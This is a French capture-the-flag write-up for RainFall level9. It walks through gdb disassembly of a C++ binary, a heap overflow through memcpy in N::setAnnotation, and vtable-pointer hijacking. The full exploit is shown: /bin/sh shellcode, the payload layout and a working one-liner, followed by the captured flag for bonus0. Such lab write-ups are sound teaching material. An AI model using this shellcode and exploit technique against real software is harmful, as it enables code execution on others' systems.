on a un exécutable qui ne fait rien lorsqu'on le lance, on le désassemble :

```
(gdb) info function
All defined functions:

Non-debugging symbols:
0x08048464  _init
0x080484b0  __cxa_atexit
0x080484b0  __cxa_atexit@plt
0x080484c0  __gmon_start__
0x080484c0  __gmon_start__@plt
0x080484d0  std::ios_base::Init::Init()
0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
0x080484e0  __libc_start_main
0x080484e0  __libc_start_main@plt
0x080484f0  _exit
0x080484f0  _exit@plt
0x08048500  _ZNSt8ios_base4InitD1Ev
0x08048500  _ZNSt8ios_base4InitD1Ev@plt
0x08048510  memcpy
0x08048510  memcpy@plt
0x08048520  strlen
0x08048520  strlen@plt
0x08048530  operator new(unsigned int)
0x08048530  _Znwj@plt
0x08048540  _start
0x08048570  __do_global_dtors_aux
0x080485d0  frame_dummy
0x080485f4  main
0x0804869a  __static_initialization_and_destruction_0(int, int)
0x080486da  _GLOBAL__sub_I_main
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
0x08048770  __libc_csu_init
0x080487e0  __libc_csu_fini
0x080487e2  __i686.get_pc_thunk.bx
0x080487f0  __do_global_ctors_aux
0x0804881c  _fini
```

on aperçoit plusieurs fonctions qui font parti de la class `N`, le désassemblage sera plus simple en cpp :

```
(gdb) disas main
Dump of assembler code for function main:
   0x080485f4 <+0>:     push   %ebp
   0x080485f5 <+1>:     mov    %esp,%ebp
   0x080485f7 <+3>:     push   %ebx
   0x080485f8 <+4>:     and    $0xfffffff0,%esp
   0x080485fb <+7>:     sub    $0x20,%esp
   0x080485fe <+10>:    cmpl   $0x1,0x8(%ebp)                     // compare 1 and argc
   0x08048602 <+14>:    jg     0x8048610 <main+28>                // if argc < 1 go to +28
   0x08048604 <+16>:    movl   $0x1,(%esp)                        // argument for exit()
   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>              // call exit()
   0x08048610 <+28>:    movl   $0x6c,(%esp)                       {
   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:    mov    %eax,%ebx
   0x0804861e <+42>:    movl   $0x5,0x4(%esp)
   0x08048626 <+50>:    mov    %ebx,(%esp)
   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>              } // call constructor of N
   0x0804862e <+58>:    mov    %ebx,0x1c(%esp)                    {
   0x08048632 <+62>:    movl   $0x6c,(%esp)
   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:    mov    %eax,%ebx
   0x08048640 <+76>:    movl   $0x6,0x4(%esp)
   0x08048648 <+84>:    mov    %ebx,(%esp)
   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>              } // call constructor of N
   0x08048650 <+92>:    mov    %ebx,0x18(%esp)
   0x08048654 <+96>:    mov    0x1c(%esp),%eax
   0x08048658 <+100>:   mov    %eax,0x14(%esp)
   0x0804865c <+104>:   mov    0x18(%esp),%eax
   0x08048660 <+108>:   mov    %eax,0x10(%esp)
   0x08048664 <+112>:   mov    0xc(%ebp),%eax
   0x08048667 <+115>:   add    $0x4,%eax
   0x0804866a <+118>:   mov    (%eax),%eax
   0x0804866c <+120>:   mov    %eax,0x4(%esp)
   0x08048670 <+124>:   mov    0x14(%esp),%eax
   0x08048674 <+128>:   mov    %eax,(%esp)                         // argument for N::setAnnotation(char*)
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc> // call N::setAnnotation(char*)
   0x0804867c <+136>:   mov    0x10(%esp),%eax                     //
   0x08048680 <+140>:   mov    (%eax),%eax
   0x08048682 <+142>:   mov    (%eax),%edx
   0x08048684 <+144>:   mov    0x14(%esp),%eax
   0x08048688 <+148>:   mov    %eax,0x4(%esp)
   0x0804868c <+152>:   mov    0x10(%esp),%eax
   0x08048690 <+156>:   mov    %eax,(%esp)
   0x08048693 <+159>:   call   *%edx                               // call operator+()
   0x08048695 <+161>:   mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:   leave  
   0x08048699 <+165>:   ret
```

on a un main qui créé deux objet `N` et un appel la fonction *setAnnotation()*

```
(gdb) disas 0x804870e
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:     push   %ebp
   0x0804870f <+1>:     mov    %esp,%ebp
   0x08048711 <+3>:     sub    $0x18,%esp              // 24 byte for local variable
   0x08048714 <+6>:     mov    0xc(%ebp),%eax          // %eax = (char*) passed in function
   0x08048717 <+9>:     mov    %eax,(%esp)             // argument for strlen()
   0x0804871a <+12>:    call   0x8048520 <strlen@plt>  // call strlen()
   0x0804871f <+17>:    mov    0x8(%ebp),%edx          // edx = actual address object
   0x08048722 <+20>:    add    $0x4,%edx               // edx = attribut of actual object
   0x08048725 <+23>:    mov    %eax,0x8(%esp)          // return of strlen() passed in argument 3 for memcpy()
   0x08048729 <+27>:    mov    0xc(%ebp),%eax          // %eax = (char*) passed in function
   0x0804872c <+30>:    mov    %eax,0x4(%esp)          // argument 2 for memcpy()
   0x08048730 <+34>:    mov    %edx,(%esp)             // argument 1 for memcpy()
   0x08048733 <+37>:    call   0x8048510 <memcpy@plt>  // call memcpy()
   0x08048738 <+42>:    leave  
   0x08048739 <+43>:    ret
```

*setAnnotation()* fait un appel à memcpy() que l'on peut utiliser pour overflow, avec https://wiremask.eu/tools/buffer-overflow-pattern-generator/? on trouve le décalage pour l'overflow :

```
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) x $eax
0x41366441:     Cannot access memory at address 0x41366441
```

avec 0x41366441 on trouve un décalage de 108 octets et il faudra rajouter 4 octets pour l'adresse

dans ce level il n'y a pas de fonctions qui lance un shell, on doit lancer nous-même le shell avec cette string ; 
*"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"*

https://kali-linux.fr/hacking/overflow-comment-executer-votre-shellcode

il faut encore qu'on trouve l'adresse de notre buffer :

```
(gdb) b *0x0804867c
Breakpoint 1 at 0x804867c
(gdb) run "aaaa"
Starting program: /home/user/level9/level9 "aaaa"

Breakpoint 1, 0x0804867c in main ()
(gdb) x $eax
0x804a00c:      0x61616161
```

*0x804a00c* est la première adresse et l'adresse du shellcode serait donc *0x804a00c + 4 = 0x804a010*

on doit envoyer un argument à l'exécutable comme ceci : *[adresse du shellcode] + [shellcode] + [décalage] + [première adresse] = 112 octets*

on peut construire et lancer notre overflow :

```
"\x10\xa0\x04\x08" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "a" * 49 + "\x0c\xa0\x04\x08"

4 + 55 + 49 + 4 = 108 + 4 = 112
```

```
level9@RainFall:~$ ./level9 $(echo -e "\x10\xa0\x04\x08\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x0c\xa0\04\x08")
$ pwd
/home/user/level9
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```